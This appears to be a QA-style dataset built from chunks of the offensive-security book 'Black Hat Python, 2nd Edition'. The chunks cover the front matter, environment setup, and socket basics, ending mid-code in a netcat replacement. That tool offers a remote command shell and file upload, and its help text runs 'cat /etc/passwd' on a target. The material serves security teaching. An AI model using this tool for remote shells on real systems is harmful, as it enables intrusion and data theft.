[
  {
    "start": 1,
    "end": 8,
    "text": "PRAISE FOR THE FIRST EDITION OF\nBLACK HAT PYTHON\n“Another incredible Python book. With a minor\ntweak or two many of these programs will have at\nleast a ten-year shelf life, and that is rare for a\nsecurity book.”\n—S\u0000\u0000\u0000\u0000\u0000\u0000 N\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000, founding president of\nthe SANS Technology Institute\n“A great book using Python for offensive security\npurposes.”\n—A\u0000\u0000\u0000\u0000\u0000 C\u0000\u0000\u0000, Volatility core developer and\ncoauthor of T\u0000\u0000 A\u0000\u0000 \u0000\u0000 M\u0000\u0000\u0000\u0000\u0000 F\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\n“If you truly have a hacker’s mindset, a spark is\nall you need to make it your own and do\nsomething even more a`mazing. Justin Seitz\noffers plenty of sparks.”\n—E\u0000\u0000\u0000\u0000\u0000\u0000 H\u0000\u0000\u0000\u0000\u0000\n“Whether you’re interested in becoming a serious\nhacker/penetration tester or just want to know\nhow they work, this book is one you need to read.\nIntense, technically sound, and eye-opening.”\n—S\u0000\u0000\u0000\u0000\u0000 H\u0000\u0000\u0000\u0000-S\u0000\u0000\u0000\u0000\u0000\u0000, IT World\n“Definitely a recommended read for the technical\nsecurity professional with some basic previous\nexposure to Python.”\n—R\u0000\u0000\u0000\u0000\u0000\u0000 A\u0000\u0000\u0000\u0000\u0000, IEEE C\u0000\u0000\u0000\u0000\u0000\nBLACK HAT PYTHON\n2nd Edition\nPython Programming for Hackers and\nPentesters\nby Justin Seitz and Tim Arnold\nSan Francisco\nBLACK HAT PYTHON, 2nd Edition. Copyright © 2021 by Justin Seitz and Tim\nArnold.\nAll rights reserved. No part of this work may be reproduced or transmitted in any\nform or by any means, electronic or mechanical, including photocopying,\nrecording, or by any information storage or retrieval system, without the prior\nwritten permission of the copyright owner and the publisher.\nISBN-13: 978-1-7185-0112-6 (print)\nISBN-13: 978-1-7185-0113-3 (ebook)\nPublisher: William Pollock\nExecutive Editor: Barbara Yien\nProduction Editor: Dapinder Dosanjh\nDevelopmental Editor: Frances Saux\nCover Illustration: Garry Booth\nInterior Design: Octopod Studios\nTechnical Reviewer: Cliff Janzen\nCopyeditor: Bart Reed\nCompositor: Jeff Lytle, Happenstance Type-O-Rama\nProofreader: Sharon Wilkey\nFor information on book distributors or translations, please contact No Starch\nPress, Inc. directly:\nNo Starch Press, Inc.\n245 8th Street, San Francisco, CA 94103\nphone: 1-415-863-9900; info@nostarch.com\nwww.nostarch.com\nLibrary of Congress Control Number: 2014953241\nNo Starch Press and the No Starch Press logo are registered trademarks of No\nStarch Press, Inc. Other product and company names mentioned herein may be\nthe trademarks of their respective owners. Rather than use a trademark symbol\nwith every occurrence of a trademarked name, we are using the names only in an\neditorial fashion and to the benefit of the trademark owner, with no intention of\ninfringement of the trademark.\nThe information in this book is distributed on an “As Is” basis, without warranty.\nWhile every precaution has been taken in the preparation of this work, neither the\nauthors nor No Starch Press, Inc. shall have any liability to any person or entity\nwith respect to any loss or damage caused or alleged to be caused directly or\nindirectly by the information contained in it.\nTo my\nbeautiful wife,\nClare. I love\nyou.\n—Justin\nAbout the Authors\nJustin Seitz is a renowned cybersecurity and open source\nintelligence practitioner and the co-founder of Dark River Systems\nInc., a Canadian security and intelligence company. His work has\nbeen featured in Popular Science, Motherboard, and Forbes. Justin\nhas authored two books on developing hacking tools. He created the\nAutomatingOSINT.com training platform and Hunchly, an open\nsource intelligence collection tool for investigators. Justin is also a\ncontributor to the citizen journalism site Bellingcat, a member of the\nInternational Criminal Court’s Technical Advisory Board, and a\nFellow at the Center for Advanced Defense Studies in Washington,\nDC.\nTim Arnold is currently a professional Python programmer and\nstatistician. He spent much of his early career at North Carolina\nState University as a respected international speaker and educator.\nAmong his accomplishments, he has ensured that educational tools\nare accessible to underserved communities worldwide, including\nmaking mathematical documentation accessible to the blind.\nFor the past many years, Tim has worked at SAS Institute as a\nprincipal software developer, designing and implementing a\npublishing system for technical and mathematical documentation. He\nhas served on the board of the Raleigh ISSA and as a consultant to\nboard of the International Statistical Institute. He enjoys working as\nan independent educator, making infosec and Python concepts\navailable to new users and elevating those with more advanced\nskills. Tim lives in North Carolina with his wife, Treva, and a\nvillainous cockatiel named Sidney. You can find him on Twitter at\n@jtimarnold.\nAbout the Technical Reviewer\nSince the early days of Commodore PET and VIC-20, technology\nhas been a constant companion to Cliff Janzen—and sometimes an\nobsession! Cliff spends a majority of his workday managing and\nmentoring a great team of security professionals, striving to stay\ntechnically relevant by tackling everything from security policy\nreviews and penetration testing to incident response. He feels lucky\nto have a career that is also his favorite hobby and a wife who\nsupports him. He is grateful to Justin for including him on the first\nedition of this wonderful book and to Tim for leading him to finally\nmake the move to Python 3. And special thanks to the fine people at\nNo Starch Press.\nFOREWORD\nIt has been six years since I wrote the foreword to the very\nsuccessful first edition of Black Hat Python. Much has changed in\nthe world during this time, but one thing hasn’t: I still write an awful\nlot of Python code. In the field of computer security, you will still\ncome across tools written in a variety of languages, depending on\nthe task. You’ll see C code written for a kernel exploit, JavaScript\ncode written for a JavaScript fuzzer, or a proxy written in a newer\n“hipper” language like Rust. But Python is still the workhorse in this\nindustry. For my money, it is still the easiest language with which to\nget started, and with the large number of libraries available, it is the\nbest language for quickly writing code to perform complex tasks in a\nsimple way. The majority of computer security tools and exploits are\nstill written in Python. This includes everything from exploit\nframeworks like CANVAS to classic fuzzers like Sulley.\nPrior to the publication of the first edition of Black Hat Python, I\nhad written many fuzzers and exploits in Python. These included\nexploits against Safari for Mac OS X, iPhone and Android phones,\nand even Second Life. (You may have to Google that last one.)\nAnyway, since then, I’ve written a pretty special exploit, with help\nof Chris Valasek, that was able to remotely compromise a 2014 Jeep\nCherokee and other cars. Of course, this exploit was written in\nPython, using the dbus-python module. All of the tools we wrote,\nwhich eventually allowed us to remotely control the steering, brakes,\nand acceleration of the compromised vehicle, were also written in\nPython. You could say, in a way, that Python was responsible for the\nrecall of 1.4 million Fiat Chrysler vehicles.\nIf you are interested in tinkering with information security tasks,\nPython is a great language to learn because of the large number of\nreverse engineering and exploitation libraries available for your use.\nNow, if only the Metasploit developers would come to their sense\nand switch from Ruby to Python, our community would be united.\nIn this new edition to what has become a beloved classic, Justin\nand Tim have updated all the code to Python 3. Personally, I’m a\ndinosaur who is hanging onto Python 2 for as long as possible, but\nas useful libraries finish migrating to Python 3, even I will soon have\nto learn it. This edition manages to cover a large range of topics that\nan enterprising young hacker would need to get started, from the\nbasics of how to read and write network packets to anything you\nmight need for web application auditing and attacking.\nIn general, Black Hat Python is a fun read written by experts with\nyears of experience who are willing to share the secrets they have\nlearned along the way. While It might not immediately turn you into a\nsuper stunt hacker like me, it will certainly get you started down the\ncorrect path.\nRemember, the difference between script kiddies and professional\nhackers is that the former uses other people’s tools.\nThe latter can write their own.\nCharlie Miller\nSecurity Researcher\nSt. Louis, Missouri\nOctober 2020\nPREFACE\nPython hacker, Python programmer. You could use either of those\nterms to describe us. Justin has spent a great deal of time\npenetration testing, which requires the ability to rapidly develop\nPython tools, with a focus on delivering results (not necessarily on\nprettiness, optimization, or even stability). Tim’s mantra is “make it\nwork, make it understandable, make it fast—in that order.” When\nyour code is readable, it becomes understandable to those you\nshare it with, but also to yourself when you look at it a few months\ndown the road. Throughout this book, you will learn that this is how\nwe code: hacking is our final purpose, and clean, understandable\ncode is the method we use to get there. We hope that this\nphilosophy and style helps you as well.\nSince the first edition of this book appeared, much has happened\nin the Python world. Python 2 reached its end-of-life in January\n2020. Python 3 has become the recommended platform for coding\nand teaching. Therefore, this second edition refactors the code and\nports it to Python 3 using the latest packages and libraries. It also\ntakes advantage of the syntax changes provided by Python 3.6 and\nhigher versions of Python 3, such as Unicode strings, context\nmanagers, and f-strings. Lastly, we’ve updated this second edition\nwith additional explanations of coding and networking concepts,\nsuch as the use of context managers, Berkeley Packet Filter syntax,\nand a comparison of the and libraries.\nctypes struct\nAs you progress through the book, you will realize that we don’t\ntake deep dives into any single topic. This is by design. We want to\ngive you the basics, with a little flavor, so that you gain foundational\nknowledge in the world of hacking tool development. With that in\nmind, we’ve sprinkled explanations, ideas, and homework\nassignments throughout the book to kickstart you in your own\ndirection. We encourage you to explore these ideas, and we would\nlove to hear about any tooling you’ve completed on your own.\nAs with any technical book, readers at different skill levels will\nexperience this book differently. Some of you may simply grab it and\nnab chapters that are pertinent to your latest consulting gig. Others\nmay read it cover to cover. If you are a novice-to-intermediate\nPython programmer, we recommend that you start at the beginning\nof the book and read the chapters in order. You will pick up some\ngood building blocks along the way.\nTo start, we lay down networking fundamentals in Chapter 2. Then\nwe slowly work our way through raw sockets in Chapter 3 and using\nScapy in Chapter 4 for some more interesting network tooling. The\nnext section of the book deals with hacking web applications, starting\nwith your own custom tooling in Chapter 5 and then extending the\npopular Burp Suite in Chapter 6. From there, we will spend a great\ndeal of time talking about trojans, beginning with using GitHub for\ncommand and control in Chapter 7, all the way through Chapter 10,\nwhere we will cover some Windows privilege escalation tricks. The\nfinal chapter is about the Volatility memory forensics library, which\nhelps you understand how the defensive side thinks and shows how\nyou can leverage their tools for offense.\nWe try to keep the code samples short and to the point, and the\nsame goes for the explanations. If you are relatively new to Python,\nwe encourage you to punch out every line to get that coding muscle\nmemory going. All of the source code examples from this book are\navailable at https://nostarch.com/black-hat-python2E/.\nHere we go!\nACKNOWLEDGMENTS\nTim offers a big thank you to his wife, Treva, for her enduring\nsupport. If it were not for several serendipitous incidents, he would\nnot have had the opportunity to work on this book. He thanks the\nRaleigh ISSA, especially Don Elsner and Nathan Kim, for supporting\nand encouraging him to teach a local class using the first edition of\nthis book. Teaching that class and working with his students led to\nhis love for the book. And to his local hacker community, not least\nthe Oak City Locksports folks, he offers thanks for their\nencouragement, and for providing a sounding board for his ideas.\nJustin would like to thank his family—his beautiful wife, Clare, and\nhis five children, Emily, Carter, Cohen, Brady, and Mason—for all of\nthe encouragement and tolerance while he spent a year and a half of\nhis life writing this book. He loves them all very much. To all his\nfriends in the cyber and OSINT community who share drinks, laughs,\nand Tweets: thanks for letting him piss and moan to you on the daily.\nAnother huge thank you to Bill Pollock of No Starch Press and to\nour patient editor, Frances Saux, for helping make the book so much\nbetter. Thanks to the rest of the team at No Starch—including Tyler,\nSerena, and Leigh—for all of the hard work you put into this book\nand the rest in your collection. We both appreciate it. We would also\nlike to thank our technical reviewer, Cliff Janzen, who provided\nabsolutely amazing support throughout the whole process. Anyone\nwho is writing an infosec book should really get him on board; he\nwas amazing and then some.",
    "question": "What is the main purpose and focus of the book \"Black Hat Python\" as described by the authors?",
    "summary": "The second edition of *Black Hat Python* updates the code to Python 3 and covers a wide range of topics for hackers and pentesters, including network packet handling, web application testing, and memory forensics. It emphasizes the importance of clean, understandable code in security tool development and provides practical examples for learning and applying Python in offensive security. The book is praised for its technical depth, real-world applications, and ability to help readers become proficient in hacking tools."
  },
  {
    "start": 9,
    "end": 12,
    "text": "1\nSETTING UP YOUR PYTHON\nENVIRONMENT\nThis is the least fun, but nevertheless\ncritical, part of the book, where we walk\nthrough setting up an environment in\nwhich to write and test Python. We’ll do\na crash course in setting up a Kali Linux\nvirtual machine (VM), creating a virtual\nenvironment for Python 3, and installing a nice\nintegrated development environment (IDE) so that\nyou have everything you need to develop code. By\nthe end of this chapter, you should be ready to tackle\nthe exercises and code examples in the remainder of\nthe book.\nBefore you get started, if you don’t have a hypervisor virtualization\nclient such as VMware Player, VirtualBox, or Hyper-V, download and\ninstall one. We also recommend that you have a Windows 10 VM at\nthe ready. You can get an evaluation Windows 10 VM\nhere:https://developer.microsoft.com/en-\nus/windows/downloads/virtual-machines/.\nInstalling Kali Linux\nKali, the successor to the BackTrack Linux distribution, was\ndesigned by Offensive Security as a penetration testing operating\nsystem. It comes with a number of tools preinstalled and is based on\nDebian Linux, so you’ll be able to install a wide variety of additional\ntools and libraries.\nYou will use Kali as your guest virtual machine. That is, you’ll\ndownload a Kali virtual machine and run it on your host machine\nusing your hypervisor of choice. You can download the Kali VM from\nhttps://www.kali.org/downloads/ and install it in your hypervisor of\nchoice. Follow the instructions given in the Kali documentation:\nhttps://www.kali.org/docs/installation/.\nWhen you’ve gone through the steps of the installation, you should\nhave the full Kali desktop environment, as shown in Figure 1-1.\nFigure 1-1: The Kali Linux desktop\nBecause there may have been important updates since the Kali\nimage was created, let’s update the machine with the latest version.\nIn the Kali shell (Applications▶Accessories▶Terminal), execute\nthe following:\ntim@kali:~$ sudo apt update\ntim@kali:~$ apt list --upgradable\ntim@kali:~$ sudo apt upgrade\ntim@kali:~$ sudo apt dist-upgrade\ntim@kali:~$ sudo apt autoremove\nSetting Up Python 3\nThe first thing we’ll do is ensure that the correct version of Python is\ninstalled. (The projects in this book use Python 3.6 or higher.) Invoke\nPython from the Kali shell and have a look:\ntim@kali:~$ python\nThis is what it looks like on our Kali machine:\nPython 2.7.17 (default, Oct 19 2019, 23:36:22)\n[GCC 9.2.1 20191008] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more\ninformation.\n>>>\nNot exactly what we’re looking for. At the time of this writing, the\ndefault version of Python on the current Kali installation is Python\n2.7.18. But this isn’t really a problem; you should have Python 3\ninstalled as well:\ntim@kali:~$ python3\nPython 3.7.5 (default, Oct 27 2019, 15:43:29)\n[GCC 9.2.1 20191022] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more\ninformation.\n>>>\nThe version of Python listed here is 3.7.5. If yours is lower than\n3.6, upgrade your distribution with the following:\n$ sudo apt-get upgrade python3\nWe will use Python 3 with a virtual environment, which is a self-\ncontained directory tree that includes a Python installation and the\nset of any extra packages you install. The virtual environment is\namong the most essential tools for a Python developer. Using one,\nyou can separate projects that have different needs. For example,\nyou might use one virtual environment for projects involving packet\ninspection and a different one for projects on binary analysis.\nBy having separate environments, you keep your projects simple\nand clean. This ensures that each environment can have its own set\nof dependencies and modules without disrupting any of your other\nprojects.\nLet’s create a virtual environment now. To get started, we need to\ninstall the package:\npython3-venv\ntim@kali:~$ sudo apt-get install python3-venv\n[sudo] password for tim:\n...\nNow we can create a virtual environment. Let’s make a new\ndirectory to work in and create the environment:\ntim@kali:~$ mkdir bhp\ntim@kali:~$ cd bhp\ntim@kali:~/bhp$ python3 -m venv venv3\ntim@kali:~/bhp$ source venv3/bin/activate\n(venv3) tim@kali:~/bhp$ python\nThat creates a new directory, bhp, in the current directory. We\ncreate a new virtual environment by calling the package with\nvenv\nthe switch and the name you want the new environment to have.\n-m\nWe’ve called ours , but you can use any name you like. The\nvenv3\nscripts, packages, and Python executable for the environment will\nlive in that directory. Next, we activate the environment by running\nthe script. Notice that the prompt changes once the\nactivate\nenvironment is activated. The name of the environment is prepended\nto your usual prompt ( in our case). Later on, when you’re\nvenv3\nready to exit the environment, use the command .\ndeactivate\nNow you have Python set up and have activated a virtual\nenvironment. Since we set up the environment to use Python 3,\nwhen you invoke Python, you no longer have to specify —\npython3\njust is fine, since that is what we installed into the virtual\npython\nenvironment. In other words, after activation, every Python command\nwill be relative to your virtual environment. Please note that using a\ndifferent version of Python might break some of the code examples\nin this book.\nWe can use the executable to install Python packages into the\npip\nvirtual environment. This is much like the package manager\napt\nbecause it enables you to directly install Python libraries into your\nvirtual environment without having to manually download, unpack,\nand install them.\nYou can search for packages and install them into your virtual\nenvironment with :\npip\n(venv3) tim@kali:~/bhp: pip search hashcrack\nLet’s do a quick test and install the module, which we’ll use in\nlxml\nChapter 5 to build a web scraper. Enter the following into your\nterminal:\n(venv3) tim@kali:~/bhp: pip install lxml\nYou should see output in your terminal indicating that the library is\nbeing downloaded and installed. Then drop into a Python shell and\nvalidate that it was installed correctly:\n(venv3) tim@kali:~/bhp$ python\nPython 3.7.5 (default, Oct 27 2019, 15:43:29)\n[GCC 9.2.1 20191022] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more\ninformation.\n>>> from lxml import etree\n>>> exit()\n(venv3) tim@kali:~/bhp$\nIf you get an error or a version of Python 2, make sure you\nfollowed all the preceding steps and that you have the up-to-date\nversion of Kali.\nKeep in mind that for most examples throughout this book, you\ncan develop your code in a variety of environments, including\nmacOS, Linux, and Windows. You may also want to set up a\ndifferent virtual environment for separate projects or chapters. Some\nchapters are Windows specific, which we’ll make sure to mention at\nthe beginning of the chapter.\nNow that we have our hacking virtual machine and a Python 3\nvirtual environment set up, let’s install a Python IDE for development.\nInstalling an IDE\nAn integrated development environment (IDE) provides a set of tools\nfor coding. Typically, it includes a code editor, with syntax\nhighlighting and automatic linting, and a debugger. The purpose of\nthe IDE is to make it easier to code and debug your programs. You\ndon’t have to use one to program in Python; for small test programs,\nyou might use any text editor (such as vim, nano, Notepad, or\nemacs). But for larger, more complex project, an IDE will be of\nenormous help to you, whether by indicating variables you have\ndefined but not used, finding misspelled variable names, or locating\nmissing package imports.\nIn a recent Python developer survey, the top two favorite IDEs\nwere PyCharm (which has commercial and free versions available)\nand Visual Studio Code (free). Justin is a fan of WingIDE\n(commercial and free versions available), and Tim uses Visual\nStudio Code (VS Code). All three IDEs can be used on Windows,\nmacOS, or Linux.\nYou can install PyCharm from\nhttps://www.jetbrains.com/pycharm/download/ or WingIDE from\nhttps://wingware.com/downloads/. You can install VS Code from the\nKali command line:\ntim@kali#: apt-get install code\nOr, to get the latest version of VS Code, download it from\nhttps://code.visualstudio.com/download/ and install with :\napt-get\ntim@kali#: apt-get install -f ./code_1.39.2-\n1571154070_amd64.deb\nThe release number, which is part of the filename, will likely be\ndifferent from the one shown here, so make sure the filename you\nuse matches the one you downloaded.\nCode Hygiene\nNo matter what you use to write your programs, it is a good idea to\nfollow a code-formatting guideline. A code style guide provides\nrecommendations to improve the readability and consistency of your\nPython code. It makes it easier for you to understand your own code\nwhen you read it later or for others if you decide to share it. The\nPython community has a such a guideline, called PEP 8. You can\nread the full PEP 8 guide here:\nhttps://www.python.org/dev/peps/pep-0008/.\nThe examples in this book generally follow PEP 8, with a few\ndifferences. You’ll see that the code in this book follows a pattern like\nthis:\n1\nfrom lxml import etree\nfrom subprocess import Popen\n2\nimport argparse\nimport os\n3\ndef get_ip(machine_name):\npass\n4\nclass Scanner:\ndef __init__(self):\npass\n5\nif __name__ == '__main__':\nscan = Scanner()\nprint('hello')\nAt the top of our program, we import the packages we need. The\nfirst import block 1 is in the form of type. Each\nfromXXXimportYYY\nimport line is in alphabetical order.\nThe same holds true for the module imports—they, too, are in\nalphabetical order 2. This ordering lets you see at a glance whether\nyou’ve imported a package without reading every line of imports, and\nit ensures that you don’t import a package twice. The intent is to\nkeep your code clean and lessen the amount you have to think when\nyou reread your code.\nNext come the functions 3, then class definitions 4, if you have\nany. Some coders prefer to never have classes and rely only on\nfunctions. There’s no hard-and-fast rule here, but if you find you’re\ntrying to maintain state with global variables or passing the same\ndata structures to several functions, that may be an indication that\nyour program would be easier to understand if you refactor it to use\na class.\nFinally, the main block at the bottom 5 gives you the opportunity to\nuse your code in two ways. First, you can use it from the command\nline. In this case, the module’s internal name is and the\n__main__\nmain block is executed. For example, if the name of the file\ncontaining the code is scan.py, you could invoke it from the\ncommand line as follows:\npython scan.py\nThis will load the functions and classes in scan.py and execute the\nmain block. You would see the response on the console.\nhello\nSecond, you can import your code into another program with no\nside effects. For example, you would import the code with\nimport scan\nSinceitsinternal name is the name of the Python module, , and\nscan\nnot , you have access to all the module’s defined functions\n__main__\nand classes, but the main block is not executed.\nYou’ll also notice we avoid variables with generic names. The\nbetter you get at naming your variables, the easier it will be to\nunderstand the program.\nYou should have a virtual machine, Python 3, a virtual\nenvironment, and an IDE. Now let’s get into some actual fun!",
    "question": "What steps are needed to set up a Python 3 environment with a virtual environment and an IDE on Kali Linux?",
    "summary": "This chapter covers setting up a Python 3 environment on Kali Linux, including installing a virtual machine, creating a virtual environment, and updating the system. It also explains how to install Python packages into the virtual environment and set up an IDE for development. The text emphasizes the importance of code formatting and structure, following PEP 8 guidelines to ensure readability and consistency in Python code."
  },
  {
    "start": 13,
    "end": 24,
    "text": "2\nBASIC NETWORKING TOOLS\nThe network is and always will be the\nsexiest arena for a hacker. An attacker\ncan do almost anything with simple\nnetwork access, such as scan for hosts,\ninject packets, sniff data, and remotely\nexploit hosts. But if you’ve worked your\nway into the deepest depths of an enterprise target,\nyou may find yourself in a bit of a conundrum: you\nhave no tools to execute network attacks. No netcat.\nNo Wireshark. No compiler, and no means to install\none. However, you might be surprised to find that in\nmany cases, you’ll have a Python install. So that’s\nwhere we’ll begin.\nThis chapter will give you some basics on Python networking\nusing the module (The full documentation can be\nsocket socket\nfound here: http://docs.python.org/3/library/socket.html.). Along the\nway, we’ll build clients, servers, and a TCP proxy. We’ll then turn\nthem into our very own netcat, complete with a command shell. This\nchapter is the foundation for subsequent chapters, in which we’ll\nbuild a host discovery tool, implement cross-platform sniffers, and\ncreate a remote trojan framework. Let’s get started.\nPython Networking in a Paragraph\nProgrammers have a number of third-party tools to create networked\nservers and clients in Python, but the core module for all of those\ntools is . This module exposes all of the necessary pieces to\nsocket\nquickly write Transmission Control Protocol (TCP) and User\nDatagram Protocol (UDP) clients and servers, use raw sockets, and\nso forth. For the purposes of breaking in or maintaining access to\ntarget machines, this module is all you really need. Let’s start by\ncreating some simple clients and servers—the two most common\nquick network scripts you’ll write.\nTCP Client\nCountless times during penetration tests, we (the authors) have\nneeded to whip up a TCP client to test for services, send garbage\ndata, fuzz, or perform any number of other tasks. If you are working\nwithin the confines of large enterprise environments, you won’t have\nthe luxury of using networking tools or compilers, and sometimes\nyou’ll even be missing the absolute basics, like the ability to\ncopy/paste or connect to the internet. This is where being able to\nquickly create a TCP client comes in extremely handy. But enough\njabbering—let’s get coding. Here is a simple TCP client:\nimport socket\ntarget_host = \"www.google.com\"\ntarget_port = 80\n# create a socket object\n1\nclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n# connect the client\n2\nclient.connect((target_host,target_port))\n# send some data\n3\nclient.send(b\"GET / HTTP/1.1\\r\\nHost: google.com\\r\\n\\r\\n\")\n# receive some data\n4\nresponse = client.recv(4096)\nprint(response.decode())\nclient.close()\nWe first create a socket object with the and\nAF_INET SOCK_STREAM\nparameters 1. The parameter indicates we’ll use a standard\nAF_INET\nIPv4 address or hostname, and indicates that this will be\nSOCK_STREAM\na TCP client. We then connect the client to the server 2 and send it\nsome data as bytes 3. The last step is to receive some data back\nand print out the response 4 and then close the socket. This is the\nsimplest form of a TCP client, but it’s the one you’ll write most often.\nThis code snippet makes some serious assumptions about\nsockets that you definitely want to be aware of. The first assumption\nis that our connection will always succeed, and the second is that the\nserver expects us to send data first (some servers expect to send\ndata to you first and await your response). Our third assumption is\nthat the server will always return data to us in a timely fashion. We\nmake these assumptions largely for simplicity’s sake. While\nprogrammers have varied opinions about how to deal with blocking\nsockets, exception-handling in sockets, and the like, it’s quite rare for\npentesters to build these niceties into their quick-and-dirty tools for\nrecon or exploitation work, so we’ll omit them in this chapter.\nUDP Client\nA Python UDP client is not much different from a TCP client; we\nneed to make only two small changes to get it to send packets in\nUDP form:\nimport socket\ntarget_host = \"127.0.0.1\"\ntarget_port = 9997\n# create a socket object\n1\nclient = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n# send some data\n2\nclient.sendto(b\"AAABBBCCC\",(target_host,target_port))\n# receive some data\n3\ndata, addr = client.recvfrom(4096)\nprint(data.decode())\nclient.close()\nAs you can see, we change the socket type to 1 when\nSOCK_DGRAM\ncreating the socket object. The next step is to simply call 2,\nsendto()\npassing in the data and the server you want to send the data to.\nBecause UDP is a connectionless protocol, there is no call to\nbeforehand. The last step is to call 3 to receive\nconnect() recvfrom()\nUDP data back. You will also notice that it returns both the data and\nthe details of the remote host and port.\nAgain, we’re not looking to be superior network programmers; we\nwant it to be quick, easy, and reliable enough to handle our day-to-\nday hacking tasks. Let’s move on to creating some simple servers.\nTCP Server\nCreating TCP servers in Python is just as easy as creating a client.\nYou might want to use your own TCP server when writing command\nshells or crafting a proxy (both of which we’ll do later). Let’s start by\ncreating a standard multithreaded TCP server. Crank out the\nfollowing code:\nimport socket\nimport threading\nIP = '0.0.0.0'\nPORT = 9998\ndef main():\nserver = socket.socket(socket.AF_INET,\nsocket.SOCK_STREAM)\n1\nserver.bind((IP, PORT))\n2\nserver.listen(5)\nprint(f'[*] Listening on {IP}:{PORT}')\nwhile True:\n3\nclient, address = server.accept()\nprint(f'[*] Accepted connection from {address[0]}:\n{address[1]}')\nclient_handler =\nthreading.Thread(target=handle_client, args=(client,))\n4\nclient_handler.start()\n5\ndef handle_client(client_socket):\nwith client_socket as sock:\nrequest = sock.recv(1024)\nprint(f'[*] Received: {request.decode(\"utf-8\")}')\nsock.send(b'ACK')\nif __name__ == '__main__':\nmain()\nTo start off, we pass in the IP address and port we want the server\nto listen on 1. Next, we tell the server to start listening 2, with a\nmaximum backlog of connections set to 5. We then put the server\ninto its main loop, where it waits for an incoming connection. When a\nclient connects 3, we receive the client socket in the variable\nclient\nand the remote connection details in the variable. We then\naddress\ncreate a new thread object that points to our function,\nhandle_client\nand we pass it the client socket object as an argument. We then start\nthe thread to handle the client connection 4, at which point the main\nserver loop is ready to handle another incoming connection. The\nfunction 5 performs the and then sends a\nhandle_client recv()\nsimple message back to the client.\nIf you use the TCP client that we built earlier, you can send some\ntest packets to the server. You should see output like the following:\n[*] Listening on 0.0.0.0:9998\n[*] Accepted connection from: 127.0.0.1:62512\n[*] Received: ABCDEF\nThat’s it! While pretty simple, this is a very useful piece of code.\nWe’ll extend it in the next couple of sections, when we build a netcat\nreplacement and a TCP proxy.\nReplacing Netcat\nNetcat is the utility knife of networking, so it’s no surprise that shrewd\nsystems administrators remove it from their systems. Such a useful\ntool would be quite an asset if an attacker managed to find a way in.\nWith it, you can read and write data across the network, meaning\nyou can use it to execute remote commands, pass files back and\nforth, or even open a remote shell. On more than one occasion,\nwe’ve run into servers that don’t have netcat installed but do have\nPython. In these cases, it’s useful to create a simple network client\nand server that you can use to push files, or a listener that gives you\ncommand line access. If you’ve broken in through a web application,\nit’s definitely worth dropping a Python callback to give you secondary\naccess without having to first burn one of your trojans or backdoors.\nCreating a tool like this is also a great Python exercise, so let’s get\nstarted writing netcat.py:\nimport argparse\nimport socket\nimport shlex\nimport subprocess\nimport sys\nimport textwrap\nimport threading\ndef execute(cmd):\ncmd = cmd.strip()\nif not cmd:\nreturn\n1\noutput = subprocess.check_output(shlex.split(cmd),\nstderr=subprocess.STDOUT)\nreturn output.decode()\nHere, we import all of our necessary libraries and set up the\nfunction, which receives a command, runs it, and returns the\nexecute\noutput as a string. This function contains a new library we haven’t\ncovered yet: the library. This library provides a powerful\nsubprocess\nprocess-creation interface that gives you a number of ways to\ninteract with client programs. In this case 1, we’re using its\nmethod, which runs a command on the local operating\ncheck_output\nsystem and then returns the output from that command.\nNow let’s create our main block responsible for handling command\nline arguments and calling the rest of our functions:\nif __name__ == '__main__':\n1\nparser = argparse.ArgumentParser(\ndescription='BHP Net Tool',\nformatter_class=argparse.RawDescriptionHelpFormatter,\n2\nepilog=textwrap.dedent('''Example:\nnetcat.py -t 192.168.1.108 -p 5555 -l -c #\ncommand shell\nnetcat.py -t 192.168.1.108 -p 5555 -l -\nu=mytest.txt # upload to file\nnetcat.py -t 192.168.1.108 -p 5555 -l -e=\\\"cat\n/etc/passwd\\\" # execute command\necho 'ABC' | ./netcat.py -t 192.168.1.108 -p 135\n# echo text to server port 135\nnetcat.py -t 192.168.1.108 -p 5555 # connect to\nserver\n'''))\nparser.add_argument('-c', '--command',\n3\naction='store_true', help='command shell')\nparser.add_argument('-e', '--execute', help='execute\nspecified command')\nparser.add_argument('-l', '--listen',\naction='store_true', help='listen')\nparser.add_argument('-p', '--port', type=int,\ndefault=5555, help='specified port')\nparser.add_argument('-t', '--target',\ndefault='192.168.1.203', help='specified IP')\nparser.add_argument('-u', '--upload', help='upload file')\nargs = parser.parse_args()\n4\nif args.listen:\nbuffer = ''\nelse:\nbuffer = sys.stdin.read()\nnc = NetCat(args, buffer.encode())\nnc.run()\nWe use the module from the standard library to create a\nargparse\ncommand line interface 1. We’ll provide arguments so it can be\ninvoked to upload a file, execute a command, or start a command\nshell.\nWe provide example usage that the program will display when the\nuser invokes it with 2 and add six arguments that specify how\n--help\nwe want the program to behave 3. The argument sets up an\n-c\ninteractive shell, the argument executes one specific command,\n-e\nthe argument indicates that a listener should be set up, the\n-l -p\nargument specifies the port on which to communicate, the\n-t\nargument specifies the target IP, and the argument specifies the\n-u\nname of a file to upload. Both the sender and receiver can use this\nprogram, so the arguments define whether it’s invoked to send or\nlisten. The , , and arguments imply the argument, because\n-c -e -u -l\nthose arguments apply to only the listener side of the\ncommunication. The sender side makes the connection to the\nlistener, and so it needs only the and arguments to define the\n-t -p\ntarget listener.\nIf we’re setting it up as a listener 4, we invoke the object\nNetCat\nwith an empty buffer string. Otherwise, we send the buffer content\nfrom . Finally, we call the method to start it up.\nstdin run\nNow let’s start putting in the plumbing for some of these features,\nbeginning with our client code. Add the following code above the\nmain block:\nclass NetCat:\n1\ndef __init__(self, args, buffer=None):\nself.args = args\nself.buffer = buffer\n2\nself.socket = socket.socket(socket.AF_INET,\nsocket.SOCK_STREAM)\nself.socket.setsockopt(socket.SOL_SOCKET,\nsocket.SO_REUSEADDR, 1)\ndef run(self):\nif self.args.listen:\n3\nself.listen()\nelse:\n4\nself.send()\nWe initialize the object with the arguments from the\nNetCat\ncommand line and the buffer 1 and then create the socket object 2.\nThe method, which is the entry point for managing the\nrun NetCat\nobject, is pretty simple: it delegates execution to two methods. If\nwe’re setting up a listener, we call the method 3. Otherwise,\nlisten\nwe call the method 4.\nsend\nNow let’s write that method:\nsend\ndef send(self):\n1\nself.socket.connect((self.args.target,\nself.args.port))\nif 